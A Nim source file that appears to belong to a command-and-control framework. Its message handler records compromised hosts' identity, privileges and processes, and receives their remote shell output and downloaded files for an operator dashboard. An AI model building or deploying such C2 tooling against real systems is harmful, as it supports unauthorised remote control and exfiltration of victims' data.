import asyncdispatch, ws, asyncfutures, strutils, json, base64

import types, logging, communication

proc processMessage*(client: C2Client, response: JsonNode) {.async.} = 
  let server = client.server

  let error = response["error"].getStr() 
  let taskId = response["taskId"].getInt(-1) 
  

  if taskId > -1:
    let task = server.tasks[taskId]
    if error != "":
      errorLog $client & ": " & error
    else: 
      case response["task"].getStr():
      of "identify":
        client.hostname = response["data"]["hostname"].getStr("")
        client.username = response["data"]["username"].getStr("")
        client.isAdmin = response["data"]["isAdmin"].getBool(false)
        client.tokenInformation = TokenInformation(
          integrityLevel: TokenIntegrityLevel(
            sid: response["data"]["ownIntegrity"].getStr("")
          )
        )
        case response["data"]["osType"].getStr("unknown"):
        of "unknown":
          client.osType = UnknownOS
        of "windows":
          client.osType = WindowsOS
        of "linux":
          client.osType = LinuxOS
        client.windowsVersionInfo = WindowsVersionInfo(
          majorVersion: response["data"]["windowsOsVersionInfo"]["majorVersion"].getInt(),
          minorVersion: response["data"]["windowsOsVersionInfo"]["minorVersion"].getInt(),
          buildNumber: response["data"]["windowsOsVersionInfo"]["buildNumber"].getInt()
        )
        client.linuxVersionInfo = LinuxVersionInfo(
          kernelVersion: response["data"]["linuxOsVersionInfo"]["kernelVersion"].getStr(),
        )
        client.isAdmin = response["data"]["isAdmin"].getBool()
        client.isAdmin = response["data"]["isAdmin"].getBool()
        if not client.loaded:
          cConnected client
          client.loaded = true
      of "output":
        let output = response["data"]["output"].getStr()
        let category = response["data"]["category"].getStr()
        if category == "TOKENINFO":
          let tokenInformation = parseJson(decode(output))
          task.output = tokenInformation
          client.tokenInformation.integrityLevel.sid = tokenInformation["tokenIntegrity"].getStr("")
          client.tokenInformation.groups = @[]
          for tokenGroup in tokenInformation["tokenGroups"]:
            client.tokenInformation.groups.add((
              name: tokenGroup["name"].getStr(""),
              sid: tokenGroup["sid"].getStr(""),
              domain: tokenGroup["domain"].getStr("")))
        elif category == "PROCESSES":
          let output = parseJson(decode(output))
          task.output = output
          client.processes = @[]
          for process in output["processes"]:
            client.processes.add((
              name: process["name"].getStr(""),
              id: process["id"].getInt(0)))
        elif category == "SHELL":
          task.output = %*{"output": decode(output)}
          logClientOutput client, category, output
      of "file":
        task.output = %*{
          "file": response["data"]["path"].getStr(),
          "data": decode(response["data"]["contents"].getStr())
        }
        infoLog "received file " & response["data"]["path"].getStr() & " from " & $client
        logClientOutput client, "DOWNLOAD", response["data"]["contents"].getStr()
    task.markAsCompleted(response)
    for wsConnection in client.server.wsConnections:
      if wsConnection.readyState == Open:
        discard wsConnection.send($(%*{
          "event": "taskstatus",
          "data": %task
        }))
  else:
    await client.askToIdentify()
